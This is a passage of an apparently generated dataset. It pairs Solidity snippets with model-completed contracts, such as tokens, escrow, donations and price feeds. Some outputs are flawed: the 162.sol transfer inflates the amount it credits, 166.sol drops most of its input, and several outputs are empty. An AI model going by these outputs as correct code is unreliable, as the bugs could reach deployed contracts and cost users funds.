        "input": "pragma solidity ^0.8;\n\ncontract UniswapV2Pair {\n}\n\ncontract MyContract {\n    function createPair() external {\n        bytes32 salt = 0x1234567890123456789012345678901234567890123456789012345678901234;\n        address pair = address(\n            new UniswapV2Pair{salt: salt}()\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract UniswapV2Pair {\n}\n\ncontract MyContract {\n    function createPair() external {\n        bytes32 salt = 0x1234567890123456789012345678901234567890123456789012345678901234;\n        address pair = address(\n            new UniswapV2Pair{salt: salt}()\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "146.sol": {
        "input": "(bool success, bytes memory data) = payable(manager).call{value: fee}(\"\");\nrequire(sent, \"transfer failed\");\n\nReason: missing revert data in call exception; Transaction reverted without a reason string\n\n    function withdrawDonations(\n        uint256 _id\n    ) public authorisedPerson(_id) returns (bool) {\n        (uint256 raisedAmount, uint256 fee) = calculatePlatformFee(_id);\n\n        require(fee <= (address(this).balance), \"fee in excess of balance\");\n\n        payable(manager).transfer(fee);\n        emit Action(_id, \"Funds Withdrawn\", msg.sender, block.timestamp);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DonationsContract {\n\n    address public manager;\n    event Action(uint256 indexed _id, string _action, address _by, uint256 _time);\n\n    modifier authorisedPerson(uint256 _id) {\n        require(msg.sender == manager, \"Not authorised\");\n        _;\n    }\n\n    constructor() public {\n        manager = msg.sender;\n    }\n\n    function calculatePlatformFee(uint256 _id) private view returns (uint256, uint256) {\n        // dummy return values, replace with your own logic\n        return (_id * 100, _id * 10);\n    }\n\n    function withdrawDonations(\n        uint256 _id\n    ) public authorisedPerson(_id) returns (bool) {\n        (uint256 raisedAmount, uint256 fee) = calculatePlatformFee(_id);\n\n        require(fee <= (address(this).balance), \"fee in excess of balance\");\n\n        (bool success, ) = payable(manager).call{value: fee}(\"\");\n        require(success, \"Transfer failed\");\n\n        emit Action(_id, \"Funds Withdrawn\", msg.sender, block.timestamp);\n        return true;\n    }\n}\n",
        "changed": 0
    },
    "147.sol": {
        "input": "{\n  networks: {\n    hardhat: {\n      blockGasLimit: 1000000000\n    },\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    uint public data;\n\n    function setData(uint _data) public {\n        data = _data;\n    }\n\n    function getData() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "148.sol": {
        "input": "AggregatorV3Interface dataFeed = AggregatorV3Interface(0x9326....);\n\n(\n  uint80 roundID, \n  int price,\n  uint startedAt,\n  uint timeStamp,\n  uint80 answeredInRound\n) = priceFeed.latestRoundData();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface AggregatorV3Interface {\n  function latestRoundData() external view returns (\n    uint80 roundID, \n    int price,\n    uint startedAt,\n    uint timeStamp,\n    uint80 answeredInRound\n  );\n}\n\ncontract PriceFeedConsumer {\n  AggregatorV3Interface internal priceFeed;\n\n  constructor() public {\n    priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n  }\n\n  function fetchLatestPrice() public view returns (uint80, int, uint, uint, uint80) {\n    (\n      uint80 roundID, \n      int price,\n      uint startedAt,\n      uint timeStamp,\n      uint80 answeredInRound\n    ) = priceFeed.latestRoundData();\n    return (roundID, price, startedAt, timeStamp, answeredInRound);\n  }\n}\n\n",
        "changed": 0
    },
    "149.sol": {
        "input": "function totalSupply() public view returns (uint256) {\n  return _totalSupply;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    string  public name = \"MyToken\";\n    string  public symbol = \"MTK\";\n    uint256 public decimals = 18;\n    uint256 private _totalSupply;\n\n    mapping(address => uint256) public balances;\n\n    constructor(uint256 initialSupply) {\n        _totalSupply = initialSupply;\n        balances[msg.sender] = _totalSupply;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        require(amount <= balances[msg.sender], \"Not enough tokens\");\n\n        balances[msg.sender] -= amount;\n        balances[recipient] += amount;\n\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "150.sol": {
        "input": "contract example{\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "contract example{\n    receive() external payable {\n    }\n}\n\n",
        "changed": 0
    },
    "151.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface I {\n    function foo() external;\n}\n\ncontract C is I {\n    function foo() override external {\n    }\n\n    function otherFunction() external {\n    }\n}\n\ncontract Factory {\n    function deploy() external {\n        I i = new C();\n        i.foo();\n\n        C c = new C();\n        c.foo();\n        c.otherFunction();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface I {\n    function foo() external;\n}\n\ncontract C is I {\n    function foo() override external {\n        // implements the `foo()` function of the `I` interface\n    }\n\n    function otherFunction() external {\n    }\n}\n\ncontract Factory {\n    function deploy() external {\n        // the `I` type variable `i` can only invoke the `foo()` function\n        I i = new C();\n        i.foo();\n\n        // the `C` type variable `c` can invoke the `otherFunction()` as well\n        C c = new C();\n        c.foo();\n        c.otherFunction();\n    }\n}\n\n",
        "changed": 0
    },
    "152.sol": {
        "input": "contract Demo {\n\n    uint number;\n\n    function set(uint _number) public {\n        number = _number + 1;\n    }\n}\n\n\n",
        "output": "contract Demo {\n\n    uint number;\n\n    function set(uint _number) public {\n        number = _number + 1;\n    }\n}\n\n",
        "changed": 0
    },
    "153.sol": {
        "input": "contract UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    function encode(uint112 y) public pure returns (uint224 z) {\n        z = uint224(y) * Q112; \n    }\n    function uqdiv(uint224 x, uint112 y) public pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n\nfunction encode(uint112 y) internal pure returns (uint224 z) {\n      z = uint224(y) * Q112; \n  }\n\n10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n\nfunction uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n   z = x / uint224(y);\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    function encode(uint112 y) public pure returns (uint224 z) {\n        z = uint224(y) * Q112; \n        return z;\n    }\n    function uqdiv(uint224 x, uint112 y) public pure returns (uint224 z) {\n        z = x / uint224(y);\n        return z;\n    }\n}\n\n",
        "changed": 0
    },
    "154.sol": {
        "input": " require(!_kryptoBirdzExists[_kryptoBird],\n\n _kryptoBirdzExists[_kryptoBird]=true;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KryptoBirdz {\n    mapping (string => bool) private _kryptoBirdzExists;\n    \n    event KryptoBirdCreated(string _kryptoBird);\n    \n    function createKryptoBird(string memory _kryptoBird) public {\n        require(!_kryptoBirdzExists[_kryptoBird], \"This kryptoBird already exists.\");\n        _kryptoBirdzExists[_kryptoBird] = true;\n        emit KryptoBirdCreated(_kryptoBird);\n    }\n    \n    function checkKryptoBirdExists(string memory _kryptoBird) public view returns(bool) {\n        return _kryptoBirdzExists[_kryptoBird];\n    }\n}\n\n",
        "changed": 0
    },
    "155.sol": {
        "input": "function getOwnerByIndex(uint index) public view returns (uint256) {\n\n    return tokenOfOwnerByIndex(address(msg.sender), index);\n}\n\nfunction getOwnerByIndex(uint256 index) public view returns (address) {\n    uint256 tokenId = tokenByIndex(index);\n    address owner = ownerOf(tokenId);\n    return owner;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "156.sol": {
        "input": " function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        return false;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n",
        "changed": 0
    },
    "157.sol": {
        "input": "            if(block.timestamp < timeStamp + 60){\n                revert timeError(timeStamp, tokenIds[i]);\n            }\n\n            require(block.timestamp > timeStamp + 60,\"not past due time\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeBased {\n    event timeError(uint256 timeStamp, uint256 tokenId);\n    mapping(uint256 => uint256) public tokenTimeStamps;\n\n    function checkTime(uint256 tokenId) public {\n        uint256 timeStamp = tokenTimeStamps[tokenId];\n        \n        if(block.timestamp < timeStamp + 60){\n            emit timeError(timeStamp, tokenId);\n            revert(\"Not past due time\");\n        }\n        \n        require(block.timestamp > timeStamp + 60,\"Not past due time\");\n        // Add the action you want to happen after the time check here\n    }\n\n    function setTokenTimeStamp(uint256 tokenId, uint256 timeStamp) public {\n        // Add any necessary checks or modifiers for setting a token's timestamp\n        tokenTimeStamps[tokenId] = timeStamp;\n    }\n}\n\n",
        "changed": 0
    },
    "158.sol": {
        "input": "_totalSupply = 1_000_000 * 1e18;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    string public constant name = \"MyToken\";\n    string public constant symbol = \"MTK\";\n    uint8 public constant decimals = 18;\n\n    mapping (address => uint256) private _balances;\n\n    uint256 private _totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        _totalSupply = 1_000_000 * 1e18;\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        require(msg.sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount <= _balances[msg.sender], \"ERC20: transfer amount exceeds balance\");\n\n        _balances[msg.sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "159.sol": {
        "input": "CompilerError: Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables. When compiling inline assembly: Variable headStart is 1 slot(s) too deep inside the stack. Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables.\n\npragma solidity 0.8.20;\n\ncontract DonationContract {\n    struct Donation {\n        string pickupDate;\n        string pickupTime;\n        string availabilityDate;\n        string pickupHours;\n        string itemType;\n        string otherItem;\n        string itemDescription;\n        uint quantity;\n        string requiresRefrigeration;\n        string bestConsumedDate;\n        string partialDonation;\n    }\n\n    Donation[] public donations;\n\n    function createDonation(\n        string memory _pickupDate,\n        string memory _pickupTime,\n        string memory _availabilityDate,\n        string memory _pickupHours,\n        string memory _itemType,\n        string memory _otherItem,\n        string memory _itemDescription,\n        uint _quantity,\n        string memory _requiresRefrigeration,\n        string memory _bestConsumedDate,\n        string memory _partialDonation\n    )\n\n    public {\n        Donation memory newDonation = Donation(\n            _pickupDate,\n            _pickupTime,\n            _availabilityDate,\n            _pickupHours,\n            _itemType,\n            _otherItem,\n            _itemDescription,\n            _quantity,\n            _requiresRefrigeration,\n            _bestConsumedDate,\n            _partialDonation\n        );\n        donations.push(newDonation);\n    }\n    function getDonationCount() public view returns (uint){\n        return donations.length;\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DonationContract {\n    struct Donation {\n        string pickupDate;\n        string pickupTime;\n        string availabilityDate;\n        string pickupHours;\n        string itemType;\n        string otherItem;\n        string itemDescription;\n        uint quantity;\n        string requiresRefrigeration;\n        string bestConsumedDate;\n        string partialDonation;\n    }\n\n    Donation[] public donations;\n\n    event DonationCreated(\n        string pickupDate,\n        string pickupTime,\n        string availabilityDate,\n        string pickupHours,\n        string itemType,\n        string otherItem,\n        string itemDescription,\n        uint quantity,\n        string requiresRefrigeration,\n        string bestConsumedDate,\n        string partialDonation\n    );\n\n    function createDonation(\n        string memory _pickupDate,\n        string memory _pickupTime,\n        string memory _availabilityDate,\n        string memory _pickupHours,\n        string memory _itemType,\n        string memory _otherItem,\n        string memory _itemDescription,\n        uint _quantity,\n        string memory _requiresRefrigeration,\n        string memory _bestConsumedDate,\n        string memory _partialDonation\n    ) public {\n        Donation memory newDonation = Donation(\n            _pickupDate,\n            _pickupTime,\n            _availabilityDate,\n            _pickupHours,\n            _itemType,\n            _otherItem,\n            _itemDescription,\n            _quantity,\n            _requiresRefrigeration,\n            _bestConsumedDate,\n            _partialDonation\n        );\n        donations.push(newDonation);\n\n        emit DonationCreated(\n            _pickupDate,\n            _pickupTime,\n            _availabilityDate,\n            _pickupHours,\n            _itemType,\n            _otherItem,\n            _itemDescription,\n            _quantity,\n            _requiresRefrigeration,\n            _bestConsumedDate,\n            _partialDonation\n        );\n    }\n\n    function getDonationCount() public view returns (uint) {\n        return donations.length;\n    }\n}\n\n",
        "changed": 0
    },
    "160.sol": {
        "input": "contract Escrow {\n\naddress owner;\n\nstruct Deposit {\n    uint256 depositAmount;\n    address buyer;\n    address seller;\n}\n\nconstructor() payable {\nowner = msg.sender;\n}\n\nmapping(bytes32 => Deposit) public depositByHash; \n\nevent DepositMade(address depositor, uint depositAmount, bytes32 hash);\n\nfunction deposit(address _seller) public payable returns(bytes32) {\n\n    require(msg.value > 0, \"error\"); \n\n    bytes32 hash = keccak256(abi.encode(msg.value, block.timestamp, _seller)); \n\n    Deposit storage _deposit = depositByHash[hash]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.buyer = msg.sender;\n    \n    _deposit.seller = _seller;  \n\n    emit DepositMade(msg.sender, msg.value, hash);\n\n    return hash; \n}\n\nfunction releaseDeposit(bytes32 hash) public {\n\n    require (msg.sender == depositByHash[hash].buyer, \"Only maker of the deposit can release deposit.\");\n\n    payable(depositByHash[hash].seller).transfer(depositByHash[hash].depositAmount);\n}\n}\n\n\n",
        "output": "contract Escrow {\n\naddress owner;\n\nstruct Deposit {\n    uint256 depositAmount;\n    address buyer;\n    address seller;\n}\n\nconstructor() payable {\nowner = msg.sender;\n}\n\nmapping(bytes32 => Deposit) public depositByHash; \n\nevent DepositMade(address depositor, uint depositAmount, bytes32 hash);\n\nfunction deposit(address _seller) public payable returns(bytes32) {\n\n    require(msg.value > 0, \"error\"); \n\n    bytes32 hash = keccak256(abi.encode(msg.value, block.timestamp, _seller)); \n\n    Deposit storage _deposit = depositByHash[hash]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.buyer = msg.sender;\n    \n    _deposit.seller = _seller;  \n\n    emit DepositMade(msg.sender, msg.value, hash);\n\n    return hash; \n}\n\nfunction releaseDeposit(bytes32 hash) public {\n\n    require (msg.sender == depositByHash[hash].buyer, \"Only maker of the deposit can release deposit.\");\n\n    payable(depositByHash[hash].seller).transfer(depositByHash[hash].depositAmount);\n}\n}\n\n",
        "changed": 0
    },
    "161.sol": {
        "input": "require(msg.value >= amount * tokenPrice[tokenId], \"Not enough funds\")\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TokenSale {\n    mapping(uint => uint) public tokenPrice;\n\n    constructor() public {\n        // Initialize token prices\n        tokenPrice[1] = 1 ether;\n        tokenPrice[2] = 2 ether;\n        // Add more tokens and their prices as needed...\n    }\n\n    function buyToken(uint tokenId, uint amount) public payable {\n        // Check if the sender has enough funds\n        require(msg.value >= amount * tokenPrice[tokenId], \"Not enough funds\");\n\n        // Logic for transferring the token to the buyer...\n        // This will depend on the specifics of your token.\n\n        // Return any excess funds\n        uint price = amount * tokenPrice[tokenId];\n        if (msg.value > price) {\n            msg.sender.transfer(msg.value - price);\n        }\n    }\n}\n\n",
        "changed": 1
    },
    "162.sol": {
        "input": "amount = _amount * 1e18;\n\namount = _amount * (10 ** 18);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC20Token {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balanceOf;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        totalSupply = _totalSupply * 10 ** uint256(decimals);\n        balanceOf[msg.sender] = totalSupply;\n    }\n\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _amount);\n        balanceOf[msg.sender] -= _amount;\n        _amount = _amount * 1e18; // or _amount = _amount * (10 ** 18);\n        balanceOf[_to] += _amount;\n        emit Transfer(msg.sender, _to, _amount);\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "163.sol": {
        "input": "function foo() external payable {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event PaymentReceived(address from, uint256 amount);\n\n    function foo() external payable {\n        emit PaymentReceived(msg.sender, msg.value);\n    }\n\n    function getBalance() public view returns(uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "164.sol": {
        "input": "contract MyERC721 is ERC721 {\n   ...\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "166.sol": {
        "input": "constructor(address _contractAddress) {\n    new = contractA(_contractAddress);\n    owner = new.owner();\n}\n\n function setOwnership(address newOwner) private {\n        owner = payable(newOwner);\n    } \n\nfunction set_data(string memory _data) public {\n    owner=setOwnership(msg.sender);\n    require(owner == msg.sender,\"You are not the owner of the contract\");\n    data = _data;\n    blocknumber = block.number;\n}\n\nmapping(address => bool) private whiteList;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractA {\n    function owner() external view returns (address) {}\n}\n\n",
        "changed": 1
    },
    "167.sol": {
        "input": "interface InterfaceB {\n    function getMessage() external pure  returns(string memory);\n}\n\n  function getMessage() external pure returns(string memory);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface InterfaceB {\n    function getMessage() external pure returns(string memory);\n}\n\n",
        "changed": 0
    },
    "168.sol": {
        "input": "   address payable private owner;\n\nconstructor() {\n    setOwner(msg.sender);\n  }\n\nfunction setOwner(address newOwner) private {\n    owner = payable(newOwner);\n  }\n\n function withdraw() external onlyOwner {\n     (bool success,)=owner.call{value:address(this).balance}(\"\");\n     require(success,\"Transfer failed!\");\n   }\n\n modifier onlyOwner() {\n    if (msg.sender != getContractOwner()) {\n      revert OnlyOwner();\n    }\n    _;\n  }\n\n  error OnlyOwner();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable private owner;\n\n    constructor() {\n        setOwner(msg.sender);\n    }\n\n    function setOwner(address newOwner) private {\n        owner = payable(newOwner);\n    }\n\n    function withdraw() external onlyOwner {\n        (bool success,)=owner.call{value:address(this).balance}(\"\");\n        require(success,\"Transfer failed!\");\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    function getContractOwner() public view returns (address) {\n        return owner;\n    }\n}\n\n",
        "changed": 0
    },
    "169.sol": {
        "input": "import \"openzeppelin-contracts/utils/math/Math.sol\";\n\nuint256 max = Math.max(a, b);\n\n\n\n",
        "output": "",
        "changed": 0
    },
    "171.sol": {
        "input": "function setGreetings(string calldata _message){\nmessage=_message;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GreetingsContract {\n    string private message;\n\n    constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n\n    function getGreetings() public view returns (string memory) {\n        return message;\n    }\n\n    function setGreetings(string calldata _message) external {\n        message = _message;\n    }\n}\n\n",
        "changed": 0
    },
    "172.sol": {
        "input": "pragma solidity ^0.5.13;\n\ncontract TransferMoney {  \n    uint public receivedBalance;\n\n    function ReceiveMoney() public payable{\n        receivedBalance += msg.value;\n    }\n\n    function ShowContractBalance() public view returns(uint){\n        return address(this).balance;\n    }\n\n    function ShowContractBalance(address payable toAccount, uint amount) public{\n        toAccount.transfer(amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.5.13;\n\ncontract TransferMoney {  \n    uint public receivedBalance;\n\n    function ReceiveMoney() public payable{\n        receivedBalance += msg.value;\n    }\n\n    function ShowContractBalance() public view returns(uint){\n        return address(this).balance;\n    }\n\n    function ShowContractBalance(address payable toAccount, uint amount) public{\n        toAccount.transfer(amount);\n    }\n}\n\n",
        "changed": 0
    },
    "173.sol": {
        "input": "Room memory room = Room(new address[](0), 0, 0);\nrooms.push(room);\n\nrooms[rooms.length-1].players.push(msg.sender);\n\nrooms[rooms.length-1].players.push([address]);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GameRoom {\n    struct Room {\n        address[] players;\n        uint256 score;\n        uint256 time;\n    }\n    \n    Room[] public rooms;\n    \n    function createRoom() public {\n        Room memory room = Room(new address[](0), 0, 0);\n        rooms.push(room);\n    }\n    \n    function joinRoom(uint256 roomIndex) public {\n        require(roomIndex < rooms.length, \"Room does not exist\");\n        rooms[roomIndex].players.push(msg.sender);\n    }\n    \n    function addPlayer(uint256 roomIndex, address player) public {\n        require(roomIndex < rooms.length, \"Room does not exist\");\n        rooms[roomIndex].players.push(player);\n    }\n}\n\n",
        "changed": 0
    },
    "174.sol": {
        "input": "mapping(address => uint) public walletIndexIncrementedMap;\nWalletScores[] scores;\n\nstruct WalletScores {\n    adddress wallet;\n    uint256 score;\n}\n\n\nfunction getOrAddWalletScore(address _wallet, uint256 score) public {\n    uint256 incrementedIndex = walletIndexIncrementedMap[_wallet];\n    if(0 == incrementedIndex) {\n        WalletScore storage walletScore = scores.push();\n        incrementedIndex = scores.length;\n        walletIndexIncrementedMap[_wallet] = incrementedIndex;\n        walletScore.wallet = _wallet;\n        walletScore.score = score;\n        return;\n    }\n    WalletScore storage walletScore = scores[incrementedIndex - 1];\n    walletScore.score += score;\n}\n\nfunction getAllScores() public returns (WalletScores[] memory walletScores) \n{\n   return scores;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WalletScoreContract {\n\n    mapping(address => uint) public walletIndexIncrementedMap;\n    WalletScores[] public scores;\n\n    struct WalletScores {\n        address wallet;\n        uint256 score;\n    }\n\n    function getOrAddWalletScore(address _wallet, uint256 _score) public {\n        uint256 incrementedIndex = walletIndexIncrementedMap[_wallet];\n        if(0 == incrementedIndex) {\n            WalletScores memory walletScore = WalletScores(_wallet, _score);\n            scores.push(walletScore);\n            incrementedIndex = scores.length;\n            walletIndexIncrementedMap[_wallet] = incrementedIndex;\n            return;\n        }\n        WalletScores storage walletScore = scores[incrementedIndex - 1];\n        walletScore.score += _score;\n    }\n\n    function getAllScores() public view returns (WalletScores[] memory) \n    {\n       return scores;\n    }\n}\n\n",
        "changed": 0
    },
    "175.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Contract1 {\n    uint[] public newData;\n    \n    constructor(uint _i){\n        newData.push(_i);\n    }\n}\n\ninterface IContract1 {\n    function newData(uint256 _index) external returns(uint);\n}\n\ncontract Contract2 {\n    uint public newOne;\n\n    function foo(address _addr, uint _i) external{\n        newOne = IContract1(_addr).newData(_i);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Contract1 {\n    // changed visibility to `public`\n    uint[] public newData;\n    \n    constructor(uint _i){\n        newData.push(_i);\n    }\n}\n\ninterface IContract1 {\n    // added `_index` argument\n    // changed the return value to one item of the array\n    function newData(uint256 _index) external returns(uint);\n}\n\ncontract Contract2 {\n    uint public newOne;\n\n    function foo(address _addr, uint _i) external{\n        // changed the call to the getter function\n        // instead of trying to access the property directly\n        newOne = IContract1(_addr).newData(_i);\n    }\n}\n\n",
        "changed": 0
    },
    "176.sol": {
        "input": " uint256 price = ethPrice;\n mapping(uint => uint) mappingEthPrice;\n\npayable(msg.sender).transfer(amountToWithdraw); \n\npragma solidity ^0.8.6;\n\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface EACAggregatorProxy {\n    function latestAnswer() external view returns (int256);\n}\n\ncontract oracleLink {\n\n    address public dev;\n    uint public devDeposit;\n    uint[] public devDeposits;\n\n    address[] public users;                   \n    uint[] public totalDeposited;  \n\n    mapping(address => uint) balances;\n\n    function deployerIsDeveloper() public payable {\n        dev = msg.sender;\n        devDeposit = msg.value;\n        devDeposits.push(devDeposit);                   \n    }\n\n    address user;\n    uint amountDeposit;\n    uint256 deadline;\n\n    uint256 lockAmount = lockAmounts[msg.sender];\n    mapping(address => uint) lockAmounts;\n\n    uint256 startTime = startTimes[block.timestamp];\n    mapping(uint => uint) startTimes; \n\n    address public chainLinkETHUSDAddress = 0x9326BFA02ADD2366b30bacB125260Af641031331;\n\n    uint public ethPrice = 0; \n    uint256 price = ethPrice;\n    mapping(uint => uint) mappingEthPrice;\n\n    function deposit(uint256 numberOfSeconds) public payable {\n\n        lockAmounts[msg.sender] = msg.value;\n        startTimes[block.timestamp] = block.timestamp;\n        \n        user = msg.sender;           \n        amountDeposit = msg.value;      \n        \n        users.push(user);                     \n        totalDeposited.push(amountDeposit);\n\n        deadline = block.timestamp + (numberOfSeconds * 1 seconds);\n\n        int256 chainLinkEthPrice = EACAggregatorProxy(chainLinkETHUSDAddress).latestAnswer();\n        ethPrice = uint(chainLinkEthPrice / 100000000);\n    }\n\n    function withdraw() public payable {\n        require(block.timestamp >= deadline);\n        uint amountToWithdraw = lockAmounts[msg.sender];\n        lockAmounts[msg.sender] = 0; \n        payable(msg.sender).transfer(amountToWithdraw); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface EACAggregatorProxy {\n    function latestAnswer() external view returns (int256);\n}\n\ncontract OracleLink {\n    address public dev;\n    uint public devDeposit;\n    uint[] public devDeposits;\n\n    address[] public users;                   \n    uint[] public totalDeposited;  \n\n    mapping(address => uint) public balances;\n\n    function deployerIsDeveloper() public payable {\n        dev = msg.sender;\n        devDeposit = msg.value;\n        devDeposits.push(devDeposit);                   \n    }\n\n    address public user;\n    uint public amountDeposit;\n    uint256 public deadline;\n\n    mapping(address => uint) public lockAmounts;\n\n    mapping(uint => uint) public startTimes; \n\n    address public chainLinkETHUSDAddress = 0x9326BFA02ADD2366b30bacB125260Af641031331;\n\n    uint public ethPrice = 0; \n    mapping(uint => uint) public mappingEthPrice;\n\n    function deposit(uint256 numberOfSeconds) public payable {\n        lockAmounts[msg.sender] = msg.value;\n        startTimes[block.timestamp] = block.timestamp;\n        \n        user = msg.sender;           \n        amountDeposit = msg.value;      \n        \n        users.push(user);                     \n        totalDeposited.push(amountDeposit);\n\n        deadline = block.timestamp + (numberOfSeconds * 1 seconds);\n\n        int256 chainLinkEthPrice = EACAggregatorProxy(chainLinkETHUSDAddress).latestAnswer();\n        ethPrice = uint(chainLinkEthPrice / 100000000);\n        mappingEthPrice[block.timestamp] = ethPrice;\n    }\n\n    function withdraw() public payable {\n        require(block.timestamp >= deadline, \"Cannot withdraw before deadline\");\n        uint amountToWithdraw = lockAmounts[msg.sender];\n        lockAmounts[msg.sender] = 0; \n        payable(msg.sender).transfer(amountToWithdraw); \n    }\n}\n\n",
        "changed": 0
    },
    "177.sol": {
        "input": "function setkturia(string memory dhmos,string memory fek,string memory apof,string memory dieuth,string memory status,string memory cid) public {\n    kturiapinakas memory value = kturiapinakas(\n        dhmos,\n        fek,\n        apof,\n        dieuth,\n        status,\n        cid,\n        block.timestamp\n    );\n    kturiaupoPinakas.push(value);\n    kturiap[block.timestamp] = value;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KturiaContract {\n    struct kturiapinakas {\n        string dhmos;\n        string fek;\n        string apof;\n        string dieuth;\n        string status;\n        string cid;\n        uint256 time;\n    }\n\n    mapping(uint256 => kturiapinakas) public kturiap;\n    kturiapinakas[] public kturiaupoPinakas;\n\n    function setkturia(string memory dhmos,string memory fek,string memory apof,string memory dieuth,string memory status,string memory cid) public {\n        kturiapinakas memory value = kturiapinakas(\n            dhmos,\n            fek,\n            apof,\n            dieuth,\n            status,\n            cid,\n            block.timestamp\n        );\n        kturiaupoPinakas.push(value);\n        kturiap[block.timestamp] = value;\n    }\n}\n\n",
        "changed": 0
    },
    "179.sol": {
        "input": "function setUser(uint256 tokenId, address user, uint64 expires) public virtual override(IERC4907){\n    if (_exists(tokenId) == false) {\n        _mint(msg.sender, tokenId); \n    }\n\n    require(_isApprovedOrOwner(msg.sender, tokenId), \"ERC4907: transfer caller is not owner nor approved\");\n    UserInfo storage info =  _users[tokenId];\n    info.user = user;\n    info.expires = expires;\n    emit UpdateUser(tokenId, user, expires);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC4907 {\n    function setUser(uint256 tokenId, address user, uint64 expires) external;\n    event UpdateUser(uint256 indexed tokenId, address indexed user, uint64 expires);\n}\n\n",
        "changed": 1
    },
    "180.sol": {
        "input": "import \"./UIntFunctions.sol\";\n\ncontract Game {\n    using UIntFunctions for uint;\n    uint public participants;\n    bool public allowTeams;\n\n    constructor(uint _participants) {\n        participants = _participants;\n        allowTeams = _participants.isEven();\n    }\n\n    function isEven(uint _participants) public returns(bool) {\n        if (_participants.isEven()) {\n            return allowTeams = true;\n        }\n        else return allowTeams;\n    }\n}\n\n\n",
